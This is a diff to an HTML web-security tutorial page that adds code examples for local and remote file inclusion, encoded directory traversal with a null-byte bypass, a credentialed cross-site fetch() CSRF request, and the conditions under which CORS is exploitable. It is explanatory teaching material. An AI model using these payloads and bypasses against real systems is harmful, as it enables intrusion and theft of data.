@@ -1723,10 +1723,19 @@ def safe_fetch(url):
                 <p>A Local File Inclusion (LFI) vulnerability happens when a web application allows user input to specify files that the server loads, without proper validation. Attackers can exploit this to read sensitive files, expose source code, or even achieve remote code execution. The fix is to sanitize user input, restrict file access, and use secure coding practices.</p>
                 <p>Local File Inclusion (LFI) occurs when a web app dynamically includes files based on user input.</p>
                 <p>If the input isn’t validated, attackers can trick the server into loading unexpected files from its local filesystem.</p>
-                <p>Example vulnerable PHP code:</p>
-                <img src="Images/LFI-1.png" width="750" height="140">
-                <p>If a user requests ?page=../../etc/passwd, the server may expose sensitive system files.</p>
-
+                <p>Example</p>
+                <p>An application dynamically loads language files or templates based on user preference.</p>
+<pre>
+include "templates/" . $_GET['theme'] . ".tpl.php";
+</pre>
+                <p>Instead of targeting /etc/passwd, the attacker targets application-generated files.</p>
+<pre>
+/index.php?theme=../../cache/session_7f3a9b
+</pre>
+                <p>Why this works</p>
+                <p>Session or cache files often contain user-controlled data.</p>
+                <p>If the attacker injects PHP code into a session value (e.g., User-Agent).</p>
+                <p>Including the session file leads to code execution.</p>
                 <div class="warning-box">
                     <h3>⚠️ Impact of LFI</h3>
                     <p><b>Sensitive File Disclosure:</b> Attackers can read files like /etc/passwd, configuration files, or logs.</p>
@@ -1792,9 +1801,19 @@ http://example.com/index.php?page=../../../../tmp/sess_abcd1234
                 <p>A Remote File Inclusion (RFI) vulnerability happens when a web application loads files based on user input without proper validation, allowing attackers to include and execute malicious files from remote servers. This can lead to remote code execution, data theft, or full server compromise. The fix is to disable remote file inclusion, validate inputs, and restrict file access.</p>
                 <p>It occurs when a web app dynamically includes files (e.g., PHP include() or require()) using user-supplied input.</p>
                 <p>If input isn’t sanitized, attackers can point the application to a remote malicious file hosted on their server.</p>
-                <p>Example vulnerable PHP code:</p>
-                <img src="Images/RFI-1.png" width="750" height="250">
-                <p>The malicious script from evil.com will run on the server.</p>
+                <p>Example</p>
+<pre>
+require $_POST['report_source'];
+</pre>
+                <p>The developer assumes only internal URLs will be used.</p>
+                <p>Attacker hosts a fake report component on a cloud storage service (not a raw PHP shell).</p>
+<pre>
+report_source=https://storage.googleapis.com/reports/monthly.php
+</pre>
+                <p>Why this is interesting</p>
+                <p>storage URLs often bypass allowlist checks</p>
+                <p>Looks like a “legitimate business resource”</p>
+                <p>Harder to detect in logs</p>
                 
                 <div class="warning-box">
                     <h3>⚠️ Impact of RFI</h3>
@@ -1851,14 +1870,22 @@ http://victim.com/index.php?page=http://attacker.com/shell.php
                     <h2>18. Directory Traversal</h2>
                 </div>
                 
-                <h3>📌 Remote File Inclusion (RFI)</h3>
+                <h3>📌 Directory Traversal</h3>
                 <p>Directory traversal occurs when attackers exploit insecure file path handling in web applications.</p>
                 <p>By inserting sequences like ../ (dot-dot-slash), attackers can “climb” out of the web root directory and access restricted files.</p>
                 <b>Example Input:</b>
+                <p>A backend service reads images for resizing.</p>
 <pre>
-http://example.com/getFile?name=../../etc/passwd
+open("/srv/images/" + filename, "rb")
 </pre>
-                <p>This could trick the server into returning the system’s password file.</p>
+                <p>Use encoded traversal combined with file extensions.</p>
+<pre>
+filename=avatars..%2f..%2fconfig%2fprod.yaml%00.jpg
+</pre>
+                <p>Why this works</p>
+                <p>%2f bypasses naive filtering</p>
+                <p>Null byte (%00) truncates extension checks</p>
+                <p>Accesses sensitive config files, not system files</p>
                 
                 <div class="warning-box">
                     <h3>⚠️ Impact of the Issue</h3>
@@ -1921,19 +1948,32 @@ http://example.com/getFile?name=../../etc/passwd
                 <p>Severity depends on what actions are available to the authenticated user.</p>
                 
                 <div class="attack-scenario-box">
-                    <h3>⚠️ How CSRF Works (Attack Scenario)</h3>
-                    <b>Scenario 1 — Simple CSRF (GET request)</b>
-                    <p>1. Victim is logged in to example.com.</p>
-                    <p>2. Attacker hosts a page with:</p>
-                    <!-- <img src="https://example.com/change-email?email=attacker@evil.com" /> -->
-                    <img src="Images/CSRF-1.png" width="100%" height="auto">
-                    <p>3. Browser automatically sends the session cookie to example.com.</p>
-                    <p>4. Victim’s email is changed without their knowledge.</p>                    
-                    <b>Scenario 2 — CSRF using POST request</b>
+                    <h3>⚠️ How CSRF Works (Attack Scenario)</h3>                   
+                    <b>Scenario 1    — CSRF using POST request</b>
                     <p>1. Attacker creates a hidden form:</p>
                     <img src="Images/CSRF-2.png"width="100%" height="auto">
                     <p>2. When a logged-in user visits the page, the form submits automatically.</p>
                     <p>3. The bank transfers money to the attacker’s account.</p>
+                    <b>Scenario 2 — CSRF using POST request</b>
+                    <p>Backend accepts JSON requests:</p>
+<pre>
+POST /api/user/preferences
+Content-Type: application/json
+</pre>
+                    <p>Session authentication via cookies.</p>
+                    <p>CSRF using fetch() from attacker-controlled site:</p>
+<pre>
+fetch("https://example.com/api/user/preferences", {
+  method: "POST",
+  credentials: "include",
+  headers: { "Content-Type": "application/json" },
+  body: JSON.stringify({ "email_notifications": false })
+});
+</pre>
+                <p>Why this works</p>
+                <p>automatically included</p>
+                <p>No CSRF token validation</p>
+                <p>Developer assumes “JSON = safe”</p>
                 </div>
 
                 <div class="remediation-box">
@@ -1973,6 +2013,18 @@ http://example.com/getFile?name=../../etc/passwd
                 <p><b>Same-Origin Policy (SOP):</b> by default, scripts can only access responses from the same origin.</p>
                 <p><b>CORS:</b> allows servers to relax SOP by specifying which origins are allowed to access their resources.</p>
                 <p><b>Important:</b> CORS is enforced by browsers only, not by the server. A misconfigured CORS policy can let attackers read sensitive data from your site.</p>
+                <h3>🎭 When it’s exploitable</h3>
+                <p><b>Origin reflection + credentials:</b> The server reflects an arbitrary Origin into Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true, allowing an attacker’s site to read in-session responses (cookies/Authorization) and steal sensitive data like API keys/PII.</p>
+                <p><b>Broken origin whitelist logic (prefix/suffix/regex mistakes):</b>Ends with / starts with checks can be bypassed with attacker domains like normal-website.com.evil-user.net or hackersnormal-website.com, resulting in unintended origins being allowed to read responses.</p>
+                <p><b>Null origin whitelisted: If the server allows Origin:</b> null (returns Access-Control-Allow-Origin: null) with credentials, attackers can force null origins (for example via sandboxed/serialized contexts) and read sensitive responses cross-origin.</p>
+                <p>Trusting a “safe” origin that has XSS: Even a “correct” CORS trust relationship becomes exploitable if the trusted origin is compromised by XSS, because injected JS can use CORS to read sensitive data from the trusting site.</p>
+                <p><b>HTTPS site trusts an HTTP subdomain:</b> If an HTTPS app allows a plain-HTTP trusted origin, a network attacker can MITM the HTTP leg and use that trust to read sensitive HTTPS responses via CORS.</p>
+                <p><b>Intranet exposure (no-credentials case):</b> If an internal app returns Access-Control-Allow-Origin: *, an external attacker site can sometimes use a victim’s browser as a proxy to read intranet resources that the attacker can’t reach directly.</p>
+                <h3>🎭 When it’s not (or usually not) exploitable</h3>
+                <p>No credentials allowed/sent ⇒ only public data exposed: PortSwigger notes most CORS attacks rely on Access-Control-Allow-Credentials: true; without it, the browser refuses to send cookies, so the attacker typically only reads unauthenticated content they could access directly anyway.</p>
+                <p>Access-Control-Allow-Origin: * with credentials doesn’t work in browsers: Browsers don’t permit Access-Control-Allow-Origin: * together with Access-Control-Allow-Credentials: true, so this combo is blocked rather than becoming “instant account takeover.”</p>
+                <p>No sensitive data in the response: OWASP highlights that Access-Control-Allow-Origin: * is mainly a security problem when the response contains sensitive information; otherwise it’s often harmless (or just poor practice).</p>
+                <p>State-changing actions without readable secrets: CORS is not CSRF protection, and CSRF can often be done without CORS; a CORS misconfig mainly increases impact when it enables reading secrets/tokens or sensitive responses.</p>
                 
                 <div class="example-box">
                     <h3>Examples</h3>
